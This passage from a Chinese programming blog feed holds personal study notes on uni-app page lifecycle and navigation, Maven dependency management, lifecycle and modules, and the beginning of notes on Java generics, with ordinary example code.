&quot;navigationStyle&quot;:&quot;custom&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h5 id="1-2-App-vue"><a href="#1-2-App-vue" class="headerlink" title="1.2 App.vue"></a>1.2 App.vue</h5><blockquote>
<p>调用<strong>应用app生命周期</strong>，配置全局样式</p>
<ul>
<li>onLauch- app加载之后，一般只调用一次<ul>
<li>访问本地缓存是否有用户登录，发送到服务器进行验证，验证通过静默登录</li>
<li>发送请求到服务器检测当前登录版本</li>
</ul>
</li>
<li>onShow- 启动或从后台进入</li>
<li>onHide- 前台进入后台</li>
</ul>
</blockquote>
<h5 id="1-3-main-js"><a href="#1-3-main-js" class="headerlink" title="1.3 main.js"></a>1.3 main.js</h5><blockquote>
<p>是uni-app的入口文件</p>
<ul>
<li>初始化vue实例</li>
<li>定义全局组件，使用需要的插件vuex</li>
</ul>
</blockquote>
<h5 id="1-4-uni-scss"><a href="#1-4-uni-scss" class="headerlink" title="1.4 uni.scss"></a>1.4 uni.scss</h5><blockquote>
<p>整体控制应用的风格</p>
</blockquote>
<h4 id="2、简单使用"><a href="#2、简单使用" class="headerlink" title="2、简单使用"></a>2、简单使用</h4><h5 id="2-1-显示返回数据"><a href="#2-1-显示返回数据" class="headerlink" title="2.1 显示返回数据"></a>2.1 显示返回数据</h5><blockquote>
<p>在模板template-view(div)中显示返回的后端数据 </p>
<p><strong>格式</strong>：{ {data} } 别名mustache   </p>
<p><strong>调用方法</strong>：@tap=”方法名”</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">	&lt;view class&#x3D;&quot;content&quot;&gt;</span><br><span class="line">		&#123;&#123;(x&gt;y)?true:false&#125;&#125;</span><br><span class="line">		&lt;br&#x2F;&gt;</span><br><span class="line">		x:&#123;&#123;x&#125;&#125; y:&#123;&#123;y&#125;&#125;</span><br><span class="line">	&lt;button @tap&#x3D;&quot;add&quot; type&#x3D;&quot;default&quot;&gt;hello&lt;&#x2F;button&gt;</span><br><span class="line">	&lt;&#x2F;view&gt;</span><br><span class="line">&lt;&#x2F;template&gt;</span><br><span class="line"></span><br><span class="line">&lt;script&gt;</span><br><span class="line">	export default &#123;</span><br><span class="line">		data() &#123;</span><br><span class="line">			return &#123;</span><br><span class="line">				x:3,</span><br><span class="line">				y:6</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;,</span><br><span class="line">		onLoad() &#123;</span><br><span class="line"></span><br><span class="line">		&#125;, </span><br><span class="line">		methods: &#123;</span><br><span class="line">			hello:function()&#123;</span><br><span class="line">				console.log(&#39;hello&#39;)</span><br><span class="line">			&#125;,</span><br><span class="line">			add:function()&#123;</span><br><span class="line">				this.x+&#x3D;1;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure>

<h5 id="2-2-v-for-in循环"><a href="#2-2-v-for-in循环" class="headerlink" title="2.2 v-for-in循环"></a>2.2 v-for-in循环</h5><blockquote>
<p>格式 v-for=”(item,index)   in 遍历的对象集合” </p>
<ul>
<li>index 即遍历的下标，item 即遍历的对象</li>
<li>对于标签内属性可用  <code>：tap=&quot; &quot;代替 tap=&quot;&#123;&#123;&#125;&#125;&quot;</code></li>
</ul>
</blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;view v-for&#x3D;&quot;(item,index) in articleList&quot; :key&#x3D;&quot;index&quot;&gt;</span><br><span class="line">		 	&#123;&#123;index&#125;&#125; &#123;&#123;item&#125;&#125;</span><br><span class="line">&lt;&#x2F;view&gt;</span><br></pre></td></tr></table></figure>



<h3 id="二、页面"><a href="#二、页面" class="headerlink" title="二、页面"></a>二、页面</h3><h4 id="1、页面生命周期"><a href="#1、页面生命周期" class="headerlink" title="1、页面生命周期"></a>1、页面生命周期</h4><h5 id="1-1-onload"><a href="#1-1-onload" class="headerlink" title="1.1 onload"></a>1.1 onload</h5><blockquote>
<p>页面加载事件</p>
</blockquote>
<blockquote>
<ul>
<li>可处理请求 <code>uni.request(&#123; url:&#39;&#39;, success(result)&#123; &#125;,fail(error)&#123; &#125;,complete()&#123; &#125; &#125;)</code></li>
<li>加载loading <code>uni.showloading(&#123;  &#125;)</code></li>
</ul>
</blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">data() &#123;</span><br><span class="line">	return &#123;</span><br><span class="line">		&#x2F;&#x2F;返回的[&#123;&#125;,&#123;&#125;..]形式数据</span><br><span class="line">		articleList: []</span><br><span class="line">	&#125;;</span><br><span class="line">&#125;,</span><br><span class="line">onLoad() &#123;</span><br><span class="line">	var _vue &#x3D; this;</span><br><span class="line">	uni.showLoading(&#123;</span><br><span class="line">		title: &#39;loading...&#39;</span><br><span class="line">	&#125;);</span><br><span class="line">	</span><br><span class="line">	uni.request(&#123;</span><br><span class="line">		url: &#39;https:&#x2F;&#x2F;unidemo.dcloud.net.cn&#x2F;api&#x2F;news&#39;,</span><br><span class="line">		success(result) &#123;</span><br><span class="line">			console.log(result.data);</span><br><span class="line">			_vue.articleList &#x3D; result.data;</span><br><span class="line">		&#125;,</span><br><span class="line">		fail(error) &#123;</span><br><span class="line">			console.log(error);</span><br><span class="line">		&#125;,</span><br><span class="line">		complete() &#123;</span><br><span class="line">			uni.hideLoading();</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;);</span><br><span class="line">&#125;,</span><br></pre></td></tr></table></figure>



<h5 id="1-2-onReachBottom"><a href="#1-2-onReachBottom" class="headerlink" title="1.2 onReachBottom"></a>1.2 onReachBottom</h5><blockquote>
<p>页面上拉触底事件</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F;注意一下request是一个异步请求，不会阻塞后面浏览器操作的运行，有时候会产生时序问题</span><br><span class="line">	onReachBottom() &#123;</span><br><span class="line">		var temArticleList &#x3D; this.articleList;</span><br><span class="line">		var length &#x3D; temArticleList.length;</span><br><span class="line">		for (var i &#x3D; 0; i &lt; length; i++) &#123;</span><br><span class="line">			this.articleList.push(temArticleList[i]);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;,</span><br></pre></td></tr></table></figure>



<h5 id="1-3-onPullDownRefresh"><a href="#1-3-onPullDownRefresh" class="headerlink" title="1.3 onPullDownRefresh"></a>1.3 onPullDownRefresh</h5><blockquote>
<p>下拉刷新事件</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">onPullDownRefresh() &#123;</span><br><span class="line">		var _vue &#x3D; this;</span><br><span class="line">		uni.showLoading(&#123;</span><br><span class="line">			title: &#39;loading...&#39;</span><br><span class="line">		&#125;);</span><br><span class="line">		uni.request(&#123;</span><br><span class="line">			url: &#39;https:&#x2F;&#x2F;unidemo.dcloud.net.cn&#x2F;api&#x2F;news&#39;,</span><br><span class="line">			success(result) &#123;</span><br><span class="line">				console.log(result.data);</span><br><span class="line">				_vue.articleList &#x3D; result.data;</span><br><span class="line">			&#125;,</span><br><span class="line">			fail(error) &#123;</span><br><span class="line">				console.log(error);</span><br><span class="line">			&#125;,</span><br><span class="line">			complete() &#123;</span><br><span class="line">				uni.hideLoading();</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;);</span><br><span class="line">&#125;,</span><br></pre></td></tr></table></figure>



<h4 id="2、页面栈"><a href="#2、页面栈" class="headerlink" title="2、页面栈"></a>2、页面栈</h4><h5 id="2-1-navigateTo"><a href="#2-1-navigateTo" class="headerlink" title="2.1 navigateTo"></a>2.1 navigateTo</h5><blockquote>
<p><strong>新页面入栈</strong></p>
</blockquote>
<blockquote>
<p>根据postid进行页面跳转</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;view @tap&#x3D;&quot;navTo&quot; :data-postid&#x3D;&quot;item.post_id&quot; v-for&#x3D;&quot;(item, index) in articleList&quot; :key&#x3D;&quot;index&quot; class&#x3D;&quot;cu-card case&quot; :class&#x3D;&quot;isCard ? &#39;no-card&#39; : &#39;&#39;&quot;&gt;</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">methods: &#123;</span><br><span class="line">	navTo: function(event) &#123;</span><br><span class="line">		var postid &#x3D; event.currentTarget.dataset.postid;</span><br><span class="line">		&#x2F;&#x2F;压栈页面跳转</span><br><span class="line">		uni.navigateTo(&#123;</span><br><span class="line">			url: &#39;news-detail&#x2F;news-detail?postid&#x3D;&#39; + postid</span><br><span class="line">		&#125;);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">export default &#123;</span><br><span class="line">	data() &#123;</span><br><span class="line">		return &#123;</span><br><span class="line">			&#x2F;&#x2F;返回的是&#123;&#125;类型数据</span><br><span class="line">			article: &#123;&#125;</span><br><span class="line">		&#125;;</span><br><span class="line">	&#125;,</span><br><span class="line">	onLoad(data) &#123;</span><br><span class="line">		var _vue &#x3D; this;</span><br><span class="line">		uni.showLoading(&#123;</span><br><span class="line">			title: &#39;loading...&#39;</span><br><span class="line">		&#125;);</span><br><span class="line">		uni.request(&#123;</span><br><span class="line">			url: &#39;https:&#x2F;&#x2F;unidemo.dcloud.net.cn&#x2F;api&#x2F;news&#x2F;36kr&#x2F;&#39; + data.postid,</span><br><span class="line">			&#x2F;&#x2F;获得请求结果</span><br><span class="line">			success(result) &#123;</span><br><span class="line">				console.log(result.data);</span><br><span class="line">				_vue.article &#x3D; result.data;</span><br><span class="line">			&#125;,</span><br><span class="line">			fail(error) &#123;</span><br><span class="line">				console.log(error);</span><br><span class="line">			&#125;,</span><br><span class="line">			complete() &#123;</span><br><span class="line">				uni.hideLoading();</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;);</span><br><span class="line">	&#125;,</span><br><span class="line">	methods: &#123;&#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>



<h5 id="2-2-redirectTo"><a href="#2-2-redirectTo" class="headerlink" title="2.2 redirectTo"></a>2.2 redirectTo</h5><blockquote>
<p><strong>页面重定向：当前页面出栈，新页面入栈</strong></p>
</blockquote>
<h5 id="2-3-switchTap"><a href="#2-3-switchTap" class="headerlink" title="2.3 switchTap"></a>2.3 switchTap</h5><blockquote>
<p><strong>Tab切换：页面全部出栈，只留下新的 Tab 页面</strong></p>
</blockquote>
<h4 id="3、页面Tap"><a href="#3、页面Tap" class="headerlink" title="3、页面Tap"></a>3、页面Tap</h4><blockquote>
<p>pages.json中的添加tabBar属性</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&quot;tabBar&quot;: &#123;</span><br><span class="line">		&quot;list&quot;: [</span><br><span class="line">			&#123;</span><br><span class="line">				&quot;pagePath&quot;: &quot;pages&#x2F;index&#x2F;index&quot;,</span><br><span class="line">				&quot;iconPath&quot;: &quot;static&#x2F;tabbar&#x2F;basics.png&quot;,</span><br><span class="line">				&quot;selectedIconPath&quot;: &quot;static&#x2F;tabbar&#x2F;basics_cur.png&quot;,</span><br><span class="line">				&quot;text&quot;: &quot;首页&quot;</span><br><span class="line">			&#125;,</span><br><span class="line">			&#123;</span><br><span class="line">				&quot;pagePath&quot;: &quot;pages&#x2F;user&#x2F;user&quot;,</span><br><span class="line">				&quot;iconPath&quot;: &quot;static&#x2F;tabbar&#x2F;about.png&quot;,</span><br><span class="line">				&quot;selectedIconPath&quot;: &quot;static&#x2F;tabbar&#x2F;about_cur.png&quot;,</span><br><span class="line">				&quot;text&quot;: &quot;个人中心&quot;</span><br><span class="line">			&#125;</span><br><span class="line">		]</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>前端</category>
      </categories>
      <tags>
        <tag>前端</tag>
      </tags>
  </entry>
  <entry>
    <title>Maven</title>
    <url>/2020/05/01/06Maven/</url>
    <content><![CDATA[<h3 id="Maven"><a href="#Maven" class="headerlink" title="Maven"></a>Maven</h3><blockquote>
<p>Maven的Apache公司开源项目，是<strong>项目构建工具</strong>，用来<strong>管理依赖</strong>。</p>
<p>优点：没有jar包</p>
<p>实现：maven项目，在maven项目中配置jar包坐标信息，根据坐标信息去jar包仓库中查找jar包。</p>
<p>环境：maven程序纯java开发，运行依赖jdk</p>
</blockquote>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line">//使得maven项目支持jdk1.8</span><br><span class="line"><span class="tag">&lt;<span class="name">properties</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">maven.compiler.source</span>&gt;</span>1.8<span class="tag">&lt;/<span class="name">maven.compiler.source</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">maven.compiler.target</span>&gt;</span>1.8<span class="tag">&lt;/<span class="name">maven.compiler.target</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">properties</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="一、环境配置"><a href="#一、环境配置" class="headerlink" title="一、环境配置"></a>一、环境配置</h3><h4 id="1、window环境变量"><a href="#1、window环境变量" class="headerlink" title="1、window环境变量"></a>1、window环境变量</h4><img src="https://csn.damyoung.cn/image-20201025223737952.png" alt="image-20201025223737952" style="zoom: 67%;" />

<img src="https://csn.damyoung.cn/image-20201025223913347.png" alt="image-20201025223913347" style="zoom:67%;" />

<img src="https://csn.damyoung.cn/image-20201025223959954.png" alt="image-20201025223959954" style="zoom:67%;" />

<h4 id="2、配置本地仓库"><a href="#2、配置本地仓库" class="headerlink" title="2、配置本地仓库"></a>2、配置本地仓库</h4><blockquote>
<p>conf-setting.xml</p>
</blockquote>
<img src="https://csn.damyoung.cn/image-20201026160220588.png" alt="image-20201026160220588" style="zoom:80%;" />

<h4 id="3、配置阿里云镜像"><a href="#3、配置阿里云镜像" class="headerlink" title="3、配置阿里云镜像"></a>3、配置阿里云镜像</h4><img src="https://csn.damyoung.cn/image-20201027154949169.png" alt="image-20201027154949169" style="zoom:80%;" />



<h3 id="二、Maven"><a href="#二、Maven" class="headerlink" title="二、Maven"></a>二、Maven</h3><blockquote>
<p><strong>搜索第三方组件</strong>：<a href="https://search.maven.org/">search.maven.org</a></p>
</blockquote>
<h4 id="1、maven概述"><a href="#1、maven概述" class="headerlink" title="1、maven概述"></a>1、maven概述</h4><h5 id="1-1-俩个核心"><a href="#1-1-俩个核心" class="headerlink" title="1.1 俩个核心"></a>1.1 俩个核心</h5><ul>
<li><p><strong>依赖管理</strong>：对jar包统一管理</p>
</li>
<li><p><strong>项目构建</strong>：项目在编译完成后，对项目进行编译、测试、打包、部署等一系列操作通过命令完成</p>
</li>
</ul>
<h5 id="1-2-仓库类型"><a href="#1-2-仓库类型" class="headerlink" title="1.2 仓库类型"></a>1.2 仓库类型</h5><blockquote>
<ul>
<li>本地仓库：在个人计算机上</li>
<li>私服：存在于<strong>局域网</strong>内一台服务器，存jar包</li>
<li>中央仓库：在<strong>互联网</strong>上，存放基本上所有开源的jar包(<a href="https://repo1.maven.org/">repo1.maven.org</a>)</li>
</ul>
<p><strong>一个jar包一旦被下载过，就会被Maven自动缓存在本地目录</strong></p>
</blockquote>
<h4 id="2、项目结构"><a href="#2、项目结构" class="headerlink" title="2、项目结构"></a>2、项目结构</h4><ul>
<li><p>pom.xml-maven<strong>项目核心配置文件</strong>project object model</p>
<ul>
<li>groupId-类似java的包名，往往是公司名称</li>
<li>artifactId-构建名</li>
<li>version- 构建版本号</li>
</ul>
<blockquote>
<p><strong>作为maven项目的唯一标识。</strong></p>
<p>引用其他第三方库时，也是通过这3个变量确定。</p>
</blockquote>
<img src="https://csn.damyoung.cn/image-20201026171335080.png" alt="image-20201026171335080" style="zoom:80%;" />
</li>
<li><p>main</p>
<ul>
<li>java-java文件</li>
<li>resources-资源配置文件</li>
</ul>
</li>
<li><p>test-单元测试</p>
</li>
<li><p><strong>target</strong>-编译打包生成的文件</p>
</li>
</ul>
<h4 id="3、依赖关系"><a href="#3、依赖关系" class="headerlink" title="3、依赖关系"></a>3、依赖关系</h4><blockquote>
<p>compile、test、runtime、provided</p>
</blockquote>
<table>
<thead>
<tr>
<th align="left">scope</th>
<th align="left">说明</th>
<th align="left">示例</th>
</tr>
</thead>
<tbody><tr>
<td align="left">compile</td>
<td align="left">编译时需要用到该jar包（默认）</td>
<td align="left">commons-logging</td>
</tr>
<tr>
<td align="left">test</td>
<td align="left">编译Test时需要用到该jar包</td>
<td align="left">junit</td>
</tr>
<tr>
<td align="left">runtime</td>
<td align="left">编译时不需要，但运行时需要用到</td>
<td align="left">mysql/jdbc驱动</td>
</tr>
<tr>
<td align="left">provided</td>
<td align="left">编译时需要用到，但运行时由JDK或某个服务器提供</td>
<td align="left">servlet-api</td>
</tr>
</tbody></table>
<h4 id="4、生命周期"><a href="#4、生命周期" class="headerlink" title="4、生命周期"></a>4、生命周期</h4><blockquote>
<p><strong>lifecycle-phase-goal</strong></p>
</blockquote>
<blockquote>
<p>Maven的生命周期lifecycle由<strong>一系列阶段phase构成</strong></p>
<ul>
<li><code>mvn</code>这个命令时，后面的参数是phase，Maven<strong>自动根据生命周期运行到指定的phase。</strong></li>
</ul>
</blockquote>
<blockquote>
<p>**生命周期default:**validate - initialize - generate-sources - ……..</p>
<p><strong>生命周期clean：</strong>preclean - clean - postclean</p>
</blockquote>
<ul>
<li><p>运行<code>mvn package</code>，Maven就会执行<code>default</code>生命周期，它会从开始一直运行到<code>package</code>这个phase为止：</p>
</li>
<li><p>运行<code>mvn compile</code>，Maven也会执行<code>default</code>生命周期，但这次它只会运行到<code>compile</code></p>
</li>
</ul>
<p><strong>常见的命令</strong></p>
<ul>
<li><code>mvn clean</code>：清理所有生成的<strong>class和jar</strong>；</li>
<li><code>mvn clean compile</code>：先清理，再执行到<code>compile</code>；</li>
<li><code>mvn clean test</code>：先清理，再执行到<code>test</code>，因为执行<code>test</code>前必须执行<code>compile</code>，所以这里不必指定<code>compile</code>；</li>
<li><code>mvn clean package</code>：先清理，再执行到<code>package</code>。</li>
</ul>
<p><strong>Goal</strong></p>
<blockquote>
<p><strong>执行一个phase又会触发一个或多个goal</strong></p>
<p><strong>goal是最小任务单元</strong></p>
<p>goal的命名总是<code>abc:xyz</code>这种形式 <strong>plugins:goal</strong> </p>
</blockquote>
<table>
<thead>
<tr>
<th align="left">执行的Phase</th>
<th align="left">对应执行的Goal</th>
</tr>
</thead>
<tbody><tr>
<td align="left">compile</td>
<td align="left">compiler:compile</td>
</tr>
<tr>
<td align="left">test</td>
<td align="left">compiler:testCompile surefire:test</td>
</tr>
</tbody></table>
<h4 id="5、插件"><a href="#5、插件" class="headerlink" title="5、插件"></a>5、插件</h4><blockquote>
<p>执行每个phase，都是通过某个插件plugin来执行</p>
<p>Maven本身其实并不知道如何执行<code>compile</code>，它只是负责找到对应的<code>compiler</code>插件，然后执行默认的<code>compiler:compile</code>这个goal来完成编译。</p>
</blockquote>
<table>
<thead>
<tr>
<th align="left">插件名称</th>
<th align="left">对应执行的phase</th>
</tr>
</thead>
<tbody><tr>
<td align="left">clean</td>
<td align="left">clean</td>
</tr>
<tr>
<td align="left">compiler</td>
<td align="left">compile</td>
</tr>
<tr>
<td align="left">surefire</td>
<td align="left">test</td>
</tr>
<tr>
<td align="left">jar</td>
<td align="left">package</td>
</tr>
</tbody></table>
<h4 id="6、Maven的模块管理"><a href="#6、Maven的模块管理" class="headerlink" title="6、Maven的模块管理"></a>6、Maven的模块管理</h4><blockquote>
<p>Maven支持模块化管理,分拆成多个模块降低软件复杂度</p>
<ul>
<li>可以通过继承parent的pom.xml统一定义重复配置</li>
<li>通过&lt; modules&gt;编译多个模块</li>
</ul>
</blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">                        ┌ ─ ─ ─ ─ ─ ─ ┐</span><br><span class="line">                          ┌─────────┐</span><br><span class="line">                        │ │Module A │ │</span><br><span class="line">                          └─────────┘</span><br><span class="line">┌──────────────┐ split  │ ┌─────────┐ │</span><br><span class="line">│Single Project│───────&gt;  │Module B │</span><br><span class="line">└──────────────┘        │ └─────────┘ │</span><br><span class="line">                          ┌─────────┐</span><br><span class="line">                        │ │Module C │ │</span><br><span class="line">                          └─────────┘</span><br><span class="line">                        └ ─ ─ ─ ─ ─ ─ ┘</span><br><span class="line">  </span><br><span class="line"> &#x2F;&#x2F;多个模块的项目结构</span><br><span class="line">multiple-project</span><br><span class="line">├── pom.xml</span><br><span class="line">├── parent</span><br><span class="line">│   └── pom.xml</span><br><span class="line">├── module-a</span><br><span class="line">│   ├── pom.xml</span><br><span class="line">│   └── src</span><br><span class="line">├── module-b</span><br><span class="line">│   ├── pom.xml</span><br><span class="line">│   └── src</span><br><span class="line">└── module-c</span><br><span class="line">    ├── pom.xml</span><br><span class="line">    └── src</span><br></pre></td></tr></table></figure>

<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">project</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://maven.apache.org/POM/4.0.0&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">xmlns:xsi</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">xsi:schemaLocation</span>=<span class="string">&quot;http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">modelVersion</span>&gt;</span>4.0.0<span class="tag">&lt;/<span class="name">modelVersion</span>&gt;</span></span><br><span class="line">	//继承parent的xml</span><br><span class="line">    <span class="tag">&lt;<span class="name">parent</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.itranswarp.learnjava<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>parent<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">relativePath</span>&gt;</span>../parent/pom.xml<span class="tag">&lt;/<span class="name">relativePath</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">parent</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>module-a<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">packaging</span>&gt;</span>jar<span class="tag">&lt;/<span class="name">packaging</span>&gt;</span></span><br><span class="line">    </span><br><span class="line">    <span class="tag">&lt;<span class="name">name</span>&gt;</span>module-a<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">    </span><br><span class="line"><span class="tag">&lt;/<span class="name">project</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>如果模块A依赖模块B，则模块A需要模块B的jar包才能正常编译，我们需要在模块A中引入模块B：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line">...</span><br><span class="line"><span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.itranswarp.learnjava<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>module-b<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>最后，在编译的时候，需要在根目录创建一个<code>pom.xml</code>统一编译：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">project</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://maven.apache.org/POM/4.0.0&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">xmlns:xsi</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">xsi:schemaLocation</span>=<span class="string">&quot;http://maven.apache.org/POM/4.0.0 http://maven.apache.org/maven-v4_0_0.xsd&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">modelVersion</span>&gt;</span>4.0.0<span class="tag">&lt;/<span class="name">modelVersion</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.itranswarp.learnjava<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>build<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">packaging</span>&gt;</span>pom<span class="tag">&lt;/<span class="name">packaging</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">name</span>&gt;</span>build<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">modules</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">module</span>&gt;</span>parent<span class="tag">&lt;/<span class="name">module</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">module</span>&gt;</span>module-a<span class="tag">&lt;/<span class="name">module</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">module</span>&gt;</span>module-b<span class="tag">&lt;/<span class="name">module</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">module</span>&gt;</span>module-c<span class="tag">&lt;/<span class="name">module</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">modules</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">project</span>&gt;</span></span><br></pre></td></tr></table></figure>



<h3 id="三、Maven-Wrapper"><a href="#三、Maven-Wrapper" class="headerlink" title="三、Maven Wrapper"></a>三、Maven Wrapper</h3><blockquote>
<p>默认情况下，系统所有项目都会使用全局安装的这个Maven版本</p>
<p>Maven Wrapper就是给一个项目<strong>提供一个独立的，指定版本的Maven给它使用</strong></p>
</blockquote>
<blockquote>
<p>在项目下执行命令为项目安装指定版本的Maven</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mvn -N io.takari:maven:0.7.6:wrapper</span><br><span class="line"></span><br><span class="line">mvn -N io.takari:maven:0.7.6:wrapper -Dmaven&#x3D;3.3.3</span><br></pre></td></tr></table></figure>

<p><img src="https://csn.damyoung.cn/image-20201029130517820.png" alt="image-20201029130517820"></p>
<blockquote>
<p>执行命令时，将mvn 改成 mvnw 就可以使用跟项目关联的Maven。</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mvnw clean package</span><br></pre></td></tr></table></figure>

]]></content>
      <tags>
        <tag>maven</tag>
      </tags>
  </entry>
  <entry>
    <title>泛型</title>
    <url>/2020/11/11/07%E6%B3%9B%E5%9E%8B/</url>
    <content><![CDATA[<h3 id="泛型"><a href="#泛型" class="headerlink" title="泛型"></a>泛型</h3><blockquote>
<p><strong>泛型是参数化类型，使用广泛的类型</strong></p>
<p><strong>声明时使用泛型，使用时确定类型</strong></p>
<p>编译时使用泛型，JVM并不知道泛型的存在，泛型使用时强制转换类型</p>
</blockquote>
<h4 id="泛型是什么？"><a href="#泛型是什么？" class="headerlink" title="泛型是什么？"></a>泛型是什么？</h4><ul>
<li>泛型是参数化类型，使用广泛的类型，声明时使用泛型，使用时确定类型</li>
<li>泛型是一个重要特性是泛型擦除，由于JVM并不知道泛型的存在，泛型在编译期就被转化为普通的类，目的是避免创建过多的类造成性能上的损耗</li>
<li>泛型在数据取出时会进行一个强制类型转换(此时若是创建泛型数组，进行强制类型转换时会出行<code>ClassCastException</code>!)</li>
</ul>
<p><strong>泛型字母</strong></p>
<blockquote>
<p>T type ，K V  ， E element</p>
</blockquote>
<p><strong>注意</strong></p>
<blockquote>
<ul>
<li>不能使用基本类型，指定类型引用类型</li>
<li>使用时自动类型检查，自动类型转换</li>
</ul>
</blockquote>
<h3 id="1、泛型的使用"><a href="#1、泛型的使用" class="headerlink" title="1、泛型的使用"></a>1、泛型的使用</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//jdk1.7以后泛型只需要声明一次，后面使用该类型</span></span><br><span class="line">Test1&lt;String&gt; s1=<span class="keyword">new</span> Test1&lt;&gt;();</span><br></pre></td></tr></table></figure>

<h5 id="1-1-泛型类"><a href="#1-1-泛型类" class="headerlink" title="1.1 泛型类"></a>1.1 泛型类</h5><blockquote>
<p>class 类名&lt;字母列表&gt;{  }</p>
</blockquote>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Test</span>&lt;<span class="title">T1</span>,<span class="title">T2</span>&gt;</span>&#123;</span><br><span class="line">    <span class="keyword">private</span>  T1 javaScore;</span><br><span class="line">    <span class="keyword">private</span>  T2 oracleScore;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

